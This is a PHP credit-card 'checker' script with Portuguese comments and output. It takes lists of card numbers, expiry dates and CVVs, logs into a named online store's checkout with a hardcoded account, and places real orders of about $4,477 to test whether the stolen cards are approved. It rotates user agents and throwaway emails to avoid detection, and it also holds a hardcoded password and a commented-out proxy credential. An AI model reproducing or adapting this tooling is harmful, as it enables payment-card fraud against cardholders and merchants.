<?php
session_start();
error_reporting(0);
set_time_limit(0);
extract($_GET);

$time = time();
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

function deletaCookie() {
    if (file_exists(getcwd() . ('/cookie.txt'))) {
        @unlink("cookie.txt");
    }
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$id = $_POST['cookie1'] ?? '';

// Caminho do arquivo
$arquivo = 's2777.txt';

// Lê o conteúdo do arquivo
$conteudo = file_get_contents($arquivo);

// Divide o conteúdo em linhas
$linhas = explode("\n", $conteudo);

// Itera sobre as linhas
foreach ($linhas as $linha) {
    // Divide a linha em partes usando o caractere |
    $partes = explode("|", $linha);
    $parte2 = explode(":", $linha);
    
    // Verifica se o primeiro elemento da parte é igual ao id
    if ($partes[0] == $id) {
        // Armazena o id e o saldo
        $im = $partes[0];

        break; // Encerra o loop, pois encontrou o id
    }
}

if ($id != $im) {
    die("USUARIO OU SENHA INCORETO\n");
}

$separa = explode("|", $lista);
$cartao = trim($separa[0]);
$mes = trim($separa[1]);
$mes1 = trim($separa[1]);
$ano = trim($separa[2]);
$cvv = trim($separa[3]);
$mes = ltrim($mes, '0');

$randomcookie = rand(000000000,999999999);
$sessionId = "0d427fd26b3c4bbe878b695df389bdca";
$orderId = "15ADC2AEAC";
$xid = "22a99aa8-64de-4d5e-b527-301c27382ea4";
$nomes = array("Gabriel", "Jose", "Eduardo", "Victor", "Rafael", "Bruno", "Douglas", "Marcos", "Matheus", "Cleiton", "Vaenssa", "Luisa", "Antonia", "Ames", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Elizabeth", "Linda", "Barbara", "Susan", "Jessica", "Margaret", "Sarah", "Alessia", "Alexa", "Alexandra", "Alice", "Alicia", "Aline", "Alison", "Alriana", "Alzira", "Amalia", "Amanda", "Amelia", "America", "Ana", "Anabel", "Anabelle", "Ananda", "Anastacia", "Andrea", "Andressa", "Anete", "Angela", "Angelica", "Angelina", "Anita", "Antuerpia", "Aparecida", "Araci", "Ariane", "Ariene", "Arisla", "Arissa", "Arlette", "Arminda", "Aryana", "Astrid", "Audrey", "Adelinda", "Assun", "Aura", "Aurelia", "Aarao", "Abdala", "Abdemis", "Abel", "Abelardo", "Abraao", "Acacio", "Adalberto", "Adamastor", "Adao", "Adauto", "Ademar", "Jose", "Lucas", "Ayrton", "Patricia", "Patrick", "Diego", "Arnaldo", "Josevaldo", "Aiyrton", "Renan", "Maria", "Genivaldo", "Joseph", "Michel", "Otavio", "Miguel", "Thais", "Carol", "Carlos", "Edvaldo", "Luiza");
$sobreNomes = array("Abreu", "Ribeiro", "Rocha", "Lima", "Godoy", "Diniz", "Andrade", "Oliveira", "Martins", "Ferreira", "Souza", "Silva", "Araujo", "Montenegro", "Anciaes", "Junior", "Andrades", "monteiro", "Joaquin", "Coltinho");

$nomes = array_rand($nomes);
$nomes = $nomes[$nomes];

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$gmail = [
"zggyskteetk@hotmail.com",
"mkhsjmafpcl@hotmail.com",
"ckxavjnlfix@hotmail.com",
"jowibvzpvew@gmail.com",
"togviryhcbk@hotmail.com",
"eblrarwktsa@outlook.com",
"ytsirawizkm@gmail.com",
"jupnxhdjhov@outlook.com",
"xpyoijpbbam@hotmail.com",
"vzddasowugg@hotmail.com",
"jcoyqvyfczk@hotmail.com",
"wfujanvknio@hotmail.com",
"mtchlsegxyb@gmail.com",
"sjrfipldaxh@gmail.com",
"vraseyycfaj@gmail.com",
"grvgvlupbsz@outlook.com",
"ffuyaqcdoaz@gmail.com",
"mfbuymogrjx@gmail.com",
"qgrsetxxfbx@hotmail.com",
"udowjwtkkgy@outlook.com",
"uyujxhgfumy@outlook.com",
"hbrvshzgefu@hotmail.com",
"xqwggegckta@hotmail.com",
"szkjtxievgh@outlook.com",
"hgwmtoldelo@hotmail.com",
"hjkdexhywkp@hotmail.com",
"ejsqrlmhldc@hotmail.com",
"eimndtiivya@hotmail.com",
"diocyljriko@outlook.com",
"ncihielanrf@hotmail.com",
"bbfykezbrod@gmail.com",
"dtdzndjxnyo@gmail.com",
"fmojaapngne@outlook.com",
"txfzyvuoowc@gmail.com",
"xucqtchphfa@hotmail.com",
"lcjsatrhaxh@hotmail.com",
"ngvxebwoqlm@gmail.com",
"cdqfnihzdyh@gmail.com",
"fbqfddrlaip@hotmail.com",
"nwsgwpvbxga@hotmail.com",
"gyfbqtspzln@outlook.com",
"bvrowebwfyo@hotmail.com",
"diomrkezymm@hotmail.com",
"jughrthagds@outlook.com",
"olrpqgwzmrt@gmail.com",
"ttfpgrddoxl@outlook.com",
"nofdtjpnseq@hotmail.com",
"nrxrywijujl@outlook.com",
"gybuifwtisy@gmail.com",
"vfslsvedidr@hotmail.com",
];


$randomgmail = array_rand($gmail);
$gg = $gmail[$randomgmail];


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/16.14050",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
];
$randomIndex = array_rand($user_agents);
$randomUserAgent = $user_agents[$randomIndex];


$url_login = "https://checkout.all-wall.com/sca-dev-2020-1/services/Account.Login.Service.ss?n=6&c=590358";
$url_after_login = "https://www.frsafetycloseouts.com/sca-dev-2020-1/checkout.ssp?is=login&login=T&fragment=login-register&_ga=2.112672323.697870301.1708791161-371309462.1708791161";

// Dados de login
$login_data = json_encode(array(
    "email" => $gg,
    "password" => "Renesmee01",
    "redirect" => "true"
));

// Cabeçalhos para a solicitação de login
$login_headers = array(
    "Accept: application/json, text/javascript, */*; q=0.01",
    "Accept-Encoding: gzip, deflate, br, zstd",
    "Accept-Language: pt-BR,pt;q=0.9",
    "Content-Type: application/json; charset=UTF-8",
    "Origin: https://checkout.all-wall.com/",
    "Referer: $url_after_login",
    "Sec-Ch-Ua: \"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"",
    "Sec-Ch-Ua-Mobile: ?0",
    "Sec-Ch-Ua-Platform: \"Windows\"",
    "Sec-Fetch-Dest: empty",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Site: same-origin",
    "User-Agent: $randomUserAgent",
    "X-Requested-With: XMLHttpRequest",
    "X-Sc-Touchpoint: checkout"
);

// Iniciar a solicitação de login
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url_login);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $login_data);
curl_setopt($ch, CURLOPT_HTTPHEADER, $login_headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true); // Inclui cabeçalhos na resposta
$response = curl_exec($ch);

// Verificar se o login foi bem-sucedido
if ($response) {
    // Verificar o texto retornado
    if (strpos($response, "ERR_WS_CUSTOMER_LOGIN") !== false) {
      echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> login incorreto</font><br>";
    } else {
        // Obter os cookies após o login
        
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $matches);
        $cookies = array();
        foreach($matches[1] as $item) {
            parse_str($item, $cookie);
            $cookies = array_merge($cookies, $cookie);
        }
        // Extrair o JSESSIONID e formatá-lo adequadamente
        $jsessionid_cookie = isset($cookies['JSESSIONID']) ? $cookies['JSESSIONID'] : '';
        $formatted_cookie = "JSESSIONID=" . $jsessionid_cookie;        
    }
} else {
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> falha na solicitação do login</font><br>";
}

$cookie = $formatted_cookie; // Definindo corretamente o cookie antes de utilizá-lo;

function add_product_to_cart($cookie){

    $payload = json_encode(array(
    array(
        "item" => array(
            "internalid" => "23269",
            "type" => "Kit"
        ),
        "quantity" => "1",
        "options" => array(
            array(
                "cartOptionId" => "custcol_certificate_amount",
                "itemOptionId" => "",
                "label" => "Gift Certificate Amount",
                "type" => "float"
            ),
            array(
                "cartOptionId" => "custcol_is_variable_line_amount",
                "itemOptionId" => "",
                "label" => "Is Variable Amount Line Item",
                "type" => "checkbox"
            ),
            array(
                "cartOptionId" => "custcol_is_variable_options_amount",
                "itemOptionId" => "",
                "label" => "Is Variable Amount Item Options",
                "type" => "checkbox"
            ),
            array(
                "cartOptionId" => "custcol_ava_udf1",
                "itemOptionId" => "",
                "label" => "UDF1",
                "type" => "text"
            ),
            array(
                "cartOptionId" => "custcol_ava_incomeaccount",
                "itemOptionId" => "",
                "label" => "IncomeAccount",
                "type" => "text"
            ),
            array(
                "cartOptionId" => "custcol_ava_taxcodemapping",
                "itemOptionId" => "",
                "label" => "TaxCode Mapping",
                "type" => "text"
            ),
            array(
                "cartOptionId" => "custcol_ava_udf2",
                "itemOptionId" => "",
                "label" => "UDF2",
                "type" => "text"
            ),
            array(
                "cartOptionId" => "custcol_ava_upccode",
                "itemOptionId" => "",
                "label" => "UPC Code",
                "type" => "text"
            ),
            array(
                "cartOptionId" => "custcol_ava_pickup",
                "itemOptionId" => "",
                "label" => "Pick Up",
                "type" => "checkbox"
            ),
            array(
                "cartOptionId" => "custcol_ava_taxamount",
                "itemOptionId" => "",
                "label" => "Tax Amount",
                "type" => "currency"
            ),
            array(
                "cartOptionId" => "custcol_ava_shipfrom_vat_bin",
                "itemOptionId" => "",
                "label" => "Ship From VAT BIN",
                "type" => "text"
            ),
            array(
                "cartOptionId" => "custcol_ava_shipto_vat_bin",
                "itemOptionId" => "",
                "label" => "Ship To VAT BIN",
                "type" => "text"
            )
        ),
        "location" => "",
        "fulfillmentChoice" => "ship",
        "freeGift" => false
    )
));

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.all-wall.com/sca-dev-2020-1/services/LiveOrder.Line.Service.ss?c=590358&n=6');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Connection: keep-alive',
    'sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile: ?1',
    "User-Agent: $randomUserAgent",
    'Content-Type: application/json; charset=UTF-8',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'X-Requested-With: XMLHttpRequest',
    'X-SC-Touchpoint: checkout',
    'sec-ch-ua-platform: "Android"',
    'Origin: https://www.frsafety.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://checkout.all-wall.com/sca-dev-2020-1/checkout.ssp?is=checkout',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    "cookie: $cookie",
]);


    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    $cart_resp = curl_exec($ch);
    echo "$cart_resp";
}



$data1 = ['{
  "addresses": [
    {
      "zip": "73008",
      "country": "US",
      "addr2": "",
      "addr1": "Oklahoma",
      "city": "Oklahoma",
      "addr3": "",
      "isvalid": "T",
      "internalid": "17138685",
      "phone": "699 934 3666",
      "defaultbilling": "T",
      "defaultshipping": "T",
      "isresidential": "F",
      "state": "Oklahoma",
      "fullname": "Jardeilson Souza",
      "company": null
    }
  ],
  "shipmethods": [
    {
      "internalid": "4714",
      "name": "FedEx 1Day Overnight (Next Business Day)",
      "shipcarrier": "nonups",
      "rate": 491.42,
      "rate_formatted": "$491.42"
    },
    {
      "internalid": "4716",
      "name": "FedEx 2Day (2nd Business Day)",
      "shipcarrier": "nonups",
      "rate": 262.86,
      "rate_formatted": "$262.86"
    },
    {
      "internalid": "4717",
      "name": "FedEx 3Day (3rd Business Day)",
      "shipcarrier": "nonups",
      "rate": 219.1,
      "rate_formatted": "$219.10"
    }
  ],
  "lines": [
    {
      "item": {
        "internalid": 23269,
        "type": "Kit"
      },
      "quantity": 1,
      "internalid": "item23269set3602063",
      "options": [],
      "location": "",
      "fulfillmentChoice": "ship",
      "freeGift": false
    }
  ],
  "paymentmethods": [
    {
      "type": "creditcard",
      "primary": true,
      "creditcard": {
        "ccnumber": "'.$cartao.'",
        "ccname": "marcos Rodrigues",
        "ccexpiredate": "'.$mes.'/'.$ano.'",
        "ccsecuritycode": "'.$cvv.'",
        "expmonth": "'.$mes.'",
        "expyear": "'.$ano.'",
        "paymentmethod": {
          "internalid": "5",
          "name": "VISA",
          "creditcard": true,
          "ispaypal": false,
          "isexternal": false,
          "key": "5,2,1555641112",
          "iscardholderauthenticationsupported": "F"
        }
      }
    }
  ],
  "internalid": null,
  "confirmation": {
    "addresses": [],
    "shipmethods": [],
    "lines": [],
    "paymentmethods": []
  },
  "multishipmethods": [],
  "lines_sort": [
    "item23269set3602058"
  ],
  "latest_addition": null,
  "promocodes": [],
  "ismultishipto": false,
  "shipmethod": "4717",
  "billaddress": "17139933",
  "shipaddress": "US-------null",
  "isPaypalComplete": false,
  "touchpoints": {
    "logout": "/sca-dev-2020-1/logOut.ssp?logoff\u003dT\u0026ckabandon\u003d_oztRoo3A5FY1MmC",
    "customercenter": "https://checkout.all-wall.com/sca-dev-2020-1/my_account.ssp",
    "serversync": "https://www.all-wall.com/app/site/backend/syncidentity.nl?c\u003d590358\u0026n\u003d6\u0026vid\u003d2vbINxY4A8Q80RqR\u0026chrole\u003d14\u0026ck\u003d_oztRoo3A5FY1MmC\u0026cktime\u003d210828",
    "viewcart": "https://www.all-wall.com/sca-dev-2020-1/goToCart.ssp?vid\u003d2vbINxY4A8Q80RqR\u0026chrole\u003d14\u0026ck\u003d_oztRoo3A5FY1MmC\u0026cktime\u003d210828\u0026cart\u003d2237415\u0026promocode\u003d\u0026promocodeaction\u003doverwrite\u0026shipmeth\u003d4717\u0026sj\u003dYgGkiWut0PXNcATuIwvM7ys4S%3B1714938369%3B760563542\u0026gc\u003dclear",
    "login": "/sca-dev-2020-1/checkout.ssp?is\u003dlogin\u0026login\u003dT",
    "welcome": "https://www.all-wall.com/s.nl?vid\u003d2vbINxY4A8Q80RqR\u0026chrole\u003d14\u0026ck\u003d_oztRoo3A5FY1MmC\u0026cktime\u003d210828\u0026cart\u003d2237415\u0026promocode\u003d\u0026promocodeaction\u003doverwrite\u0026shipmeth\u003d4717\u0026sj\u003dYgGkiWut0PXNcATuIwvM7ys4S%3B1714938369%3B760563542\u0026gc\u003dclear",
    "checkout": "/sca-dev-2020-1/checkout.ssp?is\u003dcheckout",
    "continueshopping": "https://www.all-wall.com/?vid\u003d2vbINxY4A8Q80RqR\u0026chrole\u003d14\u0026ck\u003d_oztRoo3A5FY1MmC\u0026cktime\u003d210828\u0026cart\u003d2237415\u0026promocode\u003d\u0026promocodeaction\u003doverwrite\u0026shipmeth\u003d4717\u0026sj\u003dYgGkiWut0PXNcATuIwvM7ys4S%3B1714938369%3B760563542\u0026gc\u003dclear",
    "home": "https://www.all-wall.com?vid\u003d2vbINxY4A8Q80RqR\u0026chrole\u003d14\u0026ck\u003d_oztRoo3A5FY1MmC\u0026cktime\u003d210828\u0026cart\u003d2237415\u0026promocode\u003d\u0026promocodeaction\u003doverwrite\u0026shipmeth\u003d4717\u0026sj\u003dYgGkiWut0PXNcATuIwvM7ys4S%3B1714938369%3B760563542\u0026gc\u003dclear",
    "register": "/sca-dev-2020-1/checkout.ssp?is\u003dregister\u0026login\u003dT\u0026reset\u003dT\u0026newcust\u003dT"
  },
  "agreetermcondition": true,
  "summary": {
    "discounttotal_formatted": "$0.00",
    "taxonshipping_formatted": "$0.00",
    "taxondiscount_formatted": "$0.00",
    "itemcount": 1,
    "taxonhandling_formatted": "$0.00",
    "total": 4477.9,
    "tax2total": 0,
    "discountedsubtotal": 3908,
    "taxtotal": 350.8,
    "discounttotal": 0,
    "discountedsubtotal_formatted": "$3,908.00",
    "taxondiscount": 0,
    "handlingcost_formatted": "$0.00",
    "taxonshipping": 0,
    "taxtotal_formatted": "$350.80",
    "totalcombinedtaxes_formatted": "$350.80",
    "handlingcost": 0,
    "totalcombinedtaxes": 350.8,
    "giftcertapplied_formatted": "$0.00",
    "shippingcost_formatted": "$219.10",
    "discountrate": 0,
    "taxonhandling": 0,
    "tax2total_formatted": "$0.00",
    "discountrate_formatted": "$0.00",
    "estimatedshipping": 219.1,
    "subtotal": 3908,
    "shippingcost": 219.1,
    "estimatedshipping_formatted": "$219.10",
    "total_formatted": "$4,477.90",
    "giftcertapplied": 0,
    "subtotal_formatted": "$3,908.00"
  },
  "options": {},
  "purchasenumber": "",
  "sameAs": true,
  "sessionid": "1714938374434",
  "ipaddress": "45.181.106.191"
}'];



$dats = array_rand($data1);
$data = $data1[$dats];
// Now $data is a PHP variable containing the same structure as the provided JSON data.

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://checkout.all-wall.com/sca-dev-2020-1/services/LiveOrder.Service.ss?cur=1&t=1714831141706&c=590358&n=6');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
//curl_setopt($ch, CURLOPT_PROXY, "http://brd-customer-hl_620cbf71-zone-vpsk-country-us:0978brvhaa7r@brd.superproxy.io:22225");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Connection: keep-alive',
    'sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile: ?1',
    "User-Agent: $randomUserAgent",
    'Content-Type: application/json; charset=UTF-8',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'X-Requested-With: XMLHttpRequest',
    'X-SC-Touchpoint: checkout',
    'sec-ch-ua-platform: "Android"',
    'Origin: https://www.frsafety.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://checkout.all-wall.com/sca-dev-2020-1/checkout.ssp?is=checkout',
    'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    "cookie: $cookie",
]);


curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$response1 = curl_exec($ch);
$message = inStr($response1, '"errorMessage":"', '"', 1);
$comper = "CONTATE O DESENVOLVEDOR";



if (strpos($response1, 'Card is expired')!==false) {
    echo "<font size=2 color='white'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cartao|$mes1|$ano|$cvv ➡️ (EXPIRED) ➡️</font> TEMPO: " .(time() - $time). "<br>";
}
else if (strpos($response1, 'Do Not Hono')!==false) {
  echo "<font size=2 color='white'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cartao|$mes1|$ano|$cvv ➡️ $message ➡️</font> " .(time() - $time). "<br>";
}
else if (strpos($response1, 'CVV2')!==false) {
  echo "<font size=2 color='white'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cartao|$mes1|$ano|$cvv ➡️ $message ➡️</font> TEMPO: " .(time() - $time). "<br>";
}
else if (strpos($response1, 'Funds')!==false) {
  echo "<font size=2 color='white'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cartao|$mes1|$ano|$cvv ➡️ $message ➡️</font> " .(time() - $time). "<br>";
}
else if (strpos($response1, '"success","confirmationnumber"')!==false) {
  add_product_to_cart($cookie);
  echo "<font size=2 color='white'><font class='badge badge-success'>#Aprovada <i class='zmdi zmdi-check'></i></font> $cartao|$mes1|$ano|$cvv ➡ Pending Approval ➡️</font> " .(time() - $time). "<br>";
  
}
else{
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada <i class='zmdi zmdi-close'></i></font> $cartao|$mes1|$ano|$cvv ➡️ $message ➡️</font> TEMPO: " .(time() - $time). "<br>";
}
//url_close($curl); // Comentado porque a função url_close não está definida
exit();
?>
